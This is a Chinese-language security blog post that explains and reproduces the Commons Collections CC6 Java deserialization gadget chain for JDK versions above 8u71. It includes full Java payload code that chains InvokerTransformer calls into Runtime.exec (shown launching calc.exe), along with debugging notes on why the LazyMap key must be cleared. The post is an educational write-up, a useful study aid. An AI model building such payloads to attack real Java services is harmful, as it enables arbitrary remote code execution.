> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzU0MTc2NTExNg==&mid=2247492614&idx=1&sn=2d05e9cc7f905932ff7bd4632366746b

#  关于打高版本java,cc6复现  
 实战安全研究   2025-07-14 02:01  
  
关于打高版本java,cc6复现  
  
  
从上一篇的cc1中我们发现他不能作用在jdk_8u71以上的版本，因此;为了解决这个问题，引入了cc6  
  
  
之所以不能用cc1打高版本，是由于在Java 8u71以后， sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了;  
  
  
所以这条链子走不了了，因此为了解决这一问题，**就需要看看上下文其他地方的调用LazyMap的get的地方**  
  
老规矩先找可以触发transform方法的函数;  
  
这里依然用的是LazyMap的get方法触发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKLjtFLA0GcopwyF59c7skibfBpbNgNttHic74PJys7O4gj8FSQulK7mmA/640?wx_fmt=png&from=appmsg "")  
  
  
在高版本中CC1中用到的AnnotationInvocationHandler类的Invoke无法再触发，我们找到了org.apache.commons.collections.keyvalue.TiedMapEntry类;  
  
可以看到这里使用TiedMapEntry的getvalue调用了get;  
  
只需要传进去的map等于我们的Lazymap类的实例化对象即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKnGcdBaHvXU7dA4GGMkxCLIKKTNd3cibAPGbPGcuRRHNKuaDFy0ibtMnw/640?wx_fmt=png&from=appmsg "")  
  
  
接下来继续找哪里调用了getvalue();  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblK6ribNareRGE4z2KvndITsNhfrxHDVqhAj3XicFoaHD8VxwTJgZMKKR5w/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到有3个地方调用了getvalue，equals(),hashCode(),toString()  
  
在URLDNS链子中我们知道在hashmap反序列化过程中,会触发`readObject()`方法进行重建键值对。这一过程会**自动触发键对象的`hashCode()`计算**  
  
先说toString()；这个很难找到在 readobject 中的隐式调用;  
  
而equals()在hash冲突(当两个不同键的**hashCode()**结果相同时，`HashMap`会调用`equals()`验证键是否真正相等)或  
  
集合操作时(如`contains()`、`remove()`等方法的调用（但反序列化过程很少涉及这些操作）)才会隐式触发  
  
也就是说equals()触发场景(可能需要进行需要精确构造哈希碰撞的操作)利用难度较大;  
  
而hashCode()我们知道在hashmap中hash函数进行调用  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblK2WUib1rgzibrc6d5Q1Q7WEeLfZY7jZp71jpOFTsVFQZ3DMaUDY9ib95rg/640?wx_fmt=png&from=appmsg "")  
  
在readobject中调用了hash  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblK9lyGmJP7KPiafHP6GJTcibkhowjwJ6mw7FbGqYhalqSCIDZsA6NXSatg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKQ8oXLLXqMnvBpLtGUJL7sPmXOLttWyU11ibOUsh3M37kX4nkUf4nHZw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
可以看到其中hash对传进去的key进行处理；我们只需要让TiedMapEntry类的实例对象作为key传进去即可  
  
  
因此gadget链就是  
  

```
1


```


```


graph TD
    A[HashMap.readObject] --> B[HashMap.hash]
       B --> C[TiedMapEntry.hashCode]
           C --> D[TiedMapEntry.getValue]
               D --> E[LazyMap.get]
                   E --> F[ChainedTransformer.transform]
                       F --> G[InvokerTransformer执行命令]


```

  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKxiark3IaAGwfYia1YMB1FXWf32QibJ8JkC0iaNUyVvib8cV1BgffvGC9mSA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
以下是payload  
  

```
1


```


```
public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)
       };
        Transformer[] Transformers = new Transformer[]{
              //  new ConstantTransformer(1), // 反射调用Runtime.getRuntime()
                new ConstantTransformer(Runtime.class), // 反射调用Runtime.class
                new InvokerTransformer(&#34;getMethod&#34;,
                        new Class[]{String.class, Class[].class},
                        new Object[]{&#34;getRuntime&#34;, new Class[0]}),
                new InvokerTransformer(
                        &#34;invoke&#34;,
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer(&#34;exec&#34;,
                        new Class[]{String.class},
                        new Object[]{&#34;calc.exe&#34;}), // 反射调用exec函数
                new ConstantTransformer(1)
        };
        Transformer transformerchains = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerchains);
        TiedMapEntry tme = new TiedMapEntry(outerMap, &#34;keykey&#34;);
        Map expMap = new HashMap();
        expMap.put(tme, &#34;valuevalue&#34;);
        outerMap.clear();//清空map
        Field field=ChainedTransformer.class.getDeclaredField(&#34;iTransformers&#34;);
        field.setAccessible(true);
        field.set(transformerchains,Transformers);
        //序列化
        byte[] exp=SerializationUtils.serialize((Serializable) expMap);
        //反序列化
        SerializationUtils.deserialize(exp);
    }
```

  
  
  
区分下这个clear();和上一篇的clear()的区别在于;这里的clear()是为了确保反序列化的正常执行，上一篇cc1的clear()是为了触发代理类的invoke,才进行显示调用测试；实际上调用不在"黑名单中的任意函数都可以"，比如说我显示调用entrySet()  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKpn0cBZbd0vNTv1EjmAxE2ib419rJoRLud63ibfdC4cNwWTxLokegxMLg/640?wx_fmt=png&from=appmsg "")  
  
  
下面我解释下在cc6中为什么要清空map；  
  
进行调试后发现，在LazyMap的get中;这里没有进入if判断而是直接跳过然后进入else进行返回;原因显而易见;是key已经存在值  
  
keykey了；  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKyZVN7UPGYudxHaMpzmTsmHYWibUejgia2Ks2lUYOV1uQ4DFa8VTjHwIQ/640?wx_fmt=png&from=appmsg "")  
  
  
从上下文可以知道这个keykey是在TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");赋值；  
  
但其构造函数中并没有对outmap进行操作  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKpek2icvgVaZWY7vLCfzmBcXfDvH1QmcEsrrmahObo5dPYXKoia7NUkzg/640?wx_fmt=png&from=appmsg "")  
  
  
了解过DNSURL这条链子，就会知道这其实是由于这个语句  
  
expMap.put(tme, "valuevalue");  
  
在put函数中也会调用hashcode  
  
也就是说  
  
  
expMap.put(tme, "valuevalue") 会隐式触发 TiedMapEntry.hashCode()` → `LazyMap.get("keykey")。由于之前传入的是fakeTransformers，此时链子不会触发;而在此次之后， outerMap（即LazyMap）中会存入键 "keykey";导致后续的"真实链子"不会触发;  
  
  
测试写入真实链子，可以看到在put(实际场景中是序列化时触发)时就触发了  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKq0hKmicSTIKIQOb5GPS4m4xtwIUuHicUicnib3cbld55IZspFHiaGzTr8hw/640?wx_fmt=png&from=appmsg "")  
  
因此;这时候就需要clear()清空outmap中的keykey;  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKGT43WF744uM32TPPNMnTQibB5KqGagZLJo2DY514mh5oiaeOibl5H7u8A/640?wx_fmt=png&from=appmsg "")  
  
最后  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bskbdA2iclHMetIA3wVdicnwyAUqj1qblKYaVmKUj07RiarV62NC0Om3SbeNtA9FkiaIia7JzA8icPSfib3ZgXB3ibEDDw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
这条链子没有cc1，lazymap版本动态代理那部分的"难以理解"，比较经典；用的也比较舒服的一条链子;  
  
  
再次总结下流程  
  
  
通过在LazyMap的get可以执行ChainedTransformer.transform，我们找到了TiedMapEntry.getValue去触发get，在TiedMapEntry代码中我们看到hashcode调用了getvalue，所以，我们很容易想到打URLDNS链用的hashmap中的hash触发;最后通过hashmap的readobjecct中的hash触发hashcode;  
  
  
正向流程就是在反序列化过程中 Hashmap的readobject触发hash函数，由于hash参数是TiedMapEntry对象，因此调用了TiedMapEntry的hashcode函数，在hashcode中又调用了getvalue函数，在getvalue中调用了传进来的map参数的get函数，由于我们传进去的是LazyMap对象，导致调用了LazyMap对象的get函数，触发了get的transform函数，而这个transform可控，导致我们注入我们的恶意的反射调用链去执行任意命令;  
  
  
再次贴下gadget  
  

```


graph TD
    A[HashMap.readObject] --> B[HashMap.hash]
       B --> C[TiedMapEntry.hashCode]
           C --> D[TiedMapEntry.getValue]
               D --> E[LazyMap.get]
                   E --> F[ChainedTransformer.transform]
                       F --> G[InvokerTransformer执行命令]


```

  
  
  
  
；  
  
参考文章:  
  
自己的博客:https://www.cnblogs.com/rcpw0tor-/p/18901536  
  
p牛的博客知识星球->代码审计->java系列文章  
  
https://mp.weixin.qq.com/s/AjCngDFNE2wT9JvajMMxTA  
  
  
